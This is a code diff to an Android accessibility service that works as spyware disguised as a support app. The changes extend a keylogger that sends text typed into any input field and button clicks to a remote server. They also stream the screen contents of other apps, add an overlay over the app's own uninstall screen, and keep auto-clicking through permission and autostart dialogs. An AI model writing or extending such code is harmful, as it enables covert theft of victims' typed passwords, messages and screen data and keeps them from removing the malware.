@@ -1,6 +1,7 @@
 package com.support.litework.services;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
@@ -58,6 +59,7 @@ import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.view.accessibility.AccessibilityWindowInfo;
 import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
@@ -369,7 +371,7 @@ public class MainAccessibilityService extends AccessibilityService {
             if(ACTION_SCREEN_SKELETON_MONITOR.equals(intent.getAction())) {
                 isSkeletonMonitoring = true;
                 if(Server.getContext() != null && skeletonEntryResultList.size() > 0){
-                    Server.getContext().sendScreenSkeletonMonitoring(deviceWidth, deviceHeight, skeletonEntryResultList);
+                    Server.getContext().sendScreenSkeletonMonitoring(currentPackagename, deviceWidth, deviceHeight, skeletonEntryResultList);
                 }
             }
 
@@ -579,6 +581,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         getKeyLogger(event);
         getSkeletonInfo(event);
+        findFocusedNode(event);
         goBackFromAutoStartPage(event);
         if(Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
             setPermEditorEnable(event);
@@ -722,7 +725,6 @@ public class MainAccessibilityService extends AccessibilityService {
         if(!iscanuninstallapp) {
             CharSequence packagename = String.valueOf(event.getPackageName());
             CharSequence classname = String.valueOf(event.getClassName());
-
             if(packagename.equals("com.google.android.packageinstaller") ||
                     packagename.equals("com.android.systemui") ||
                     packagename.equals("com.miui.home") ||
@@ -750,6 +752,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                 getAppDetailPage(rootNode);
                 if (isSelectedApp && isAppDetail) {
+                    makeOverlayRemoveScreen();
                     onGoBack();
                 }
             }
@@ -922,8 +925,8 @@ public class MainAccessibilityService extends AccessibilityService {
             }
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                 AccessibilityNodeInfo source = event.getSource();
-                if (source != null) {
-                    if(source.getText() != null) {
+                if (source != null && source.getClassName() != null) {
+                    if(source.getText() != null && source.getClassName().equals("android.widget.EditText")) {
                         text = source.getText().toString();
                         eventString = "Text Input";
                         if(Server.getContext() != null) {
@@ -934,18 +937,18 @@ public class MainAccessibilityService extends AccessibilityService {
                     }
                 }
             }
-
         }
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-            if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
-                AccessibilityNodeInfo source = event.getSource();
-                if (source != null) {
-                    if(source.getText() != null) {
-                        text = source.getText().toString();
-                        eventString = "Text Input";
-                        if(Server.getContext() != null) {
-                            if(isKeylogger) {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null && source.getClassName() != null) {
+                if(source.getText() != null && source.getClassName().equals("android.widget.EditText")) {
+                    text = source.getText().toString();
+                    eventString = "Text Input";
+                    if(Server.getContext() != null) {
+                        if(isKeylogger) {
+                            if(!text.equals("•")){
+                                Log.d("Skeleton Text::", text.toString());
                                 Server.getContext().sendKeyLog(text, packagename, eventString);
                             }
                         }
@@ -965,7 +968,6 @@ public class MainAccessibilityService extends AccessibilityService {
                         if(source.getText() != null) {
                             Button_Text = source.getText().toString().toLowerCase();
                             text = Button_Text;
-
                             eventString = "Button Click";
                             if(isKeylogger) {
                                 if(!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消"))
@@ -981,7 +983,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public void getMediaProjectionPermission(AccessibilityNodeInfo node) {
 //        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
         if(node != null) {
-            if (node.isVisibleToUser() &&  node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
                     if(Common.getInstance().getMediaProjection()) {
@@ -1016,10 +1018,13 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if(node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()))) {
+                    if(node.isVisibleToUser()){
+                        Log.d("isVisibleToUser", nodeText);
+                    }
+                    if(node.isVisibleToUser() && nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
                         isSelectedApp = true;
                     }
-                    if (node.isVisibleToUser() && nodeText.contains(" ") && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
+                    if (node.isVisibleToUser() && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
                         isUninstallapp = true;
                     }
                 }
@@ -1101,7 +1106,6 @@ public class MainAccessibilityService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             CharSequence packagename = String.valueOf(event.getPackageName());
             CharSequence classname = String.valueOf(event.getClassName());
-            Log.d("packagename::", packagename + "  " + classname);
             if (packagename.equals("com.miui.securitycenter")) {
                 if(classname !=null && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
                     onGoBack();
@@ -1128,18 +1132,33 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
-    private void getSkeletonInfo(AccessibilityEvent event) {
-        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
-            focusedNode = event.getSource();
-            isEditable = focusedNode != null && focusedNode.getClassName().equals("android.widget.EditText");
+    private void findFocusedNode(AccessibilityEvent event) {
+        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if(rootNode != null) {
+                focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+                if (focusedNode != null && focusedNode.isVisibleToUser() && focusedNode.getClassName().equals("android.widget.EditText")) {
+                    isEditable = true;
+                    CharSequence currentText = focusedNode.getText();
+                    if (currentText != null) {
+                        Log.d("AccessibilityService", "Focused input text: " + currentText.toString());
+                    } else {
+                        Log.d("AccessibilityService", "EditText is empty or null");
+                    }
+                }
+            }
         }
+    }
 
+    private void getSkeletonInfo(AccessibilityEvent event) {
+        String packageName = String.valueOf(event.getPackageName());
         skeletonEntryResultList.clear();
         skeletonEntryResultList.addAll(printVisibleViewSkeleton(getRootInActiveWindow()));
 
         if(Server.getContext() != null && skeletonEntryResultList.size() > 0){
             if(isSkeletonMonitoring) {
-                Server.getContext().sendScreenSkeletonMonitoring(deviceWidth, deviceHeight, skeletonEntryResultList);
+                Server.getContext().sendScreenSkeletonMonitoring(packageName, deviceWidth, deviceHeight, skeletonEntryResultList);
             }
         } else {
             Log.d("Root info", "no info");
@@ -1271,7 +1290,7 @@ public class MainAccessibilityService extends AccessibilityService {
                         (nodeInfo.getContentDescription() != null ? nodeInfo.getContentDescription().toString() : "");
                 Rect rect = new Rect();
                 nodeInfo.getBoundsInScreen(rect);
-                skeletonEntryList.add(new SkeletonEntry(text, type, rect.left, rect.top, rect.width(), rect.height()));
+                skeletonEntryList.add(new SkeletonEntry(text, type, rect.left, rect.top, rect.width(), rect.height(), currentPackagename));
             }
 
             // Recursively process child nodes and collect their results
